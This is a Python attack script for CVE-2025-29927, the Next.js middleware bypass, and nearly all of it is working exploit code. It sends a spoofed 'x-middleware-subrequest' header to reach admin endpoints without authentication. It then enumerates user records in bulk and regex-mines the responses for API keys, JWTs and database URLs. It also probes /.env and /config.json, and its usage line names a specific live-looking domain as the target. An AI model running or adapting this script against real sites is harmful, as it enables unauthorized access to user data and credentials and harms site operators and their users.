#!/usr/bin/env python3
"""
CVE-2025-29927 Next.js Middleware Bypass – Advanced Reconnaissance
Parametrized for authorized testing. Single-vector focused attack.
Faster iteration on high-priority targets.
"""

import requests
import time
import urllib.parse
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional
from collections import defaultdict

class FastRecon:
    def __init__(self, base_url: str, output_prefix: str = "recon"):
        self.BASE_URL = base_url.rstrip("/")
        self.OUTPUT_PREFIX = output_prefix
        self.TIMEOUT = 10
        self.THREADS = 15
        
        # CVE-2025-29927 bypass
        self.HEADERS = {
            "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
            "User-Agent": "Mozilla/5.0",
        }
        
        self.findings = defaultdict(list)
    
    def test_bypass_active(self) -> bool:
        """Verify bypass header works."""
        url = f"{self.BASE_URL}/api/admin/users?page=1&limit=1"
        try:
            resp = requests.get(url, headers=self.HEADERS, timeout=self.TIMEOUT)
            if resp.status_code == 200:
                print("[+] Bypass header ACTIVE - admin access confirmed")
                return True
            elif resp.status_code == 401:
                print("[!] Bypass blocked by auth - authentication required")
                return False
        except Exception as e:
            print(f"[-] Connection failed: {e}")
        return False
    
    def enum_users_batch(self, pages: int = 10):
        """Quickly enumerate all users."""
        print(f"\n[*] Enumerating users (max {pages} pages)...")
        all_users = []
        
        for page in range(1, pages + 1):
            url = f"{self.BASE_URL}/api/admin/users?page={page}&limit=1000"
            try:
                resp = requests.get(url, headers=self.HEADERS, timeout=self.TIMEOUT)
                if resp.status_code == 200:
                    data = resp.json()
                    users = data.get("users", []) or data.get("data", [])
                    if not users:
                        break
                    all_users.extend(users)
                    print(f"  Page {page}: +{len(users)} users (total: {len(all_users)})")
            except:
                break
            time.sleep(0.1)
        
        if all_users:
            self.findings["users"] = all_users
            self._save(f"{self.OUTPUT_PREFIX}_users.json", json.dumps(all_users, indent=2))
            return len(all_users)
        return 0
    
    def find_secrets_in_responses(self):
        """Mine all saved responses for secrets."""
        print(f"\n[*] Extracting secrets from responses...")
        
        patterns = {
            "api_keys": r'["\']?(api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_]{20,})["\']',
            "jwt": r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
            "db_urls": r'(mongodb|postgres|mysql)://[^\s"\']+'
        }
        
        secrets = defaultdict(list)
        for key, value in self.findings.items():
            if isinstance(value, (list, dict)):
                text = json.dumps(value)
                for secret_type, pattern in patterns.items():
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    if matches:
                        secrets[secret_type].extend(matches)
        
        if secrets:
            print(f"[+] Found secrets: {dict(secrets)}")
            self._save(f"{self.OUTPUT_PREFIX}_secrets.json", json.dumps(dict(secrets), indent=2))

    def parallel_test_endpoints(self, endpoints: List[str]):
        """Test multiple endpoints concurrently."""
        print(f"\n[*] Testing {len(endpoints)} endpoints...")
        
        results = defaultdict(list)
        futures = []
        
        with ThreadPoolExecutor(max_workers=self.THREADS) as executor:
            for endpoint in endpoints:
                future = executor.submit(self._test_endpoint, endpoint, results)
                futures.append(future)
            
            for future in as_completed(futures):
                future.result()
        
        if results:
            self.findings["endpoints"] = dict(results)
            self._save(f"{self.OUTPUT_PREFIX}_endpoints.json", json.dumps(dict(results), indent=2))
        
        return results
    
    def _test_endpoint(self, endpoint: str, results: Dict):
        """Test single endpoint."""
        url = f"{self.BASE_URL}{endpoint}"
        try:
            resp = requests.get(url, headers=self.HEADERS, timeout=self.TIMEOUT)
            results[endpoint].append({
                "status": resp.status_code,
                "content_length": len(resp.text),
                "accessible": resp.status_code == 200
            })
            
            if resp.status_code == 200 and len(resp.text) > 50:
                print(f"  [+] {endpoint}: {resp.status_code}")
        except Exception as e:
            results[endpoint].append({"error": str(e)})
    
    def _save(self, filename: str, content: str):
        """Save findings."""
        with open(filename, "w") as f:
            f.write(content)
        print(f"[+] Saved: {filename}")

# Quick CLI
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 cve_2025_29927_recon.py <target_url> [pages]")
        print("Example: python3 cve_2025_29927_recon.py https://vosu.ai 20")
        sys.exit(1)
    
    target = sys.argv[1]
    pages = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    
    recon = FastRecon(target)
    
    if recon.test_bypass_active():
        recon.enum_users_batch(pages)
        recon.find_secrets_in_responses()
        
        # Test common admin endpoints
        test_endpoints = [
            "/api/admin/users",
            "/api/admin/permissions",
            "/api/admin/bonus-campaigns",
            "/api/graphql",
            "/.env",
            "/config.json",
        ]
        recon.parallel_test_endpoints(test_endpoints)
    else:
        print("[-] Target not vulnerable or offline")
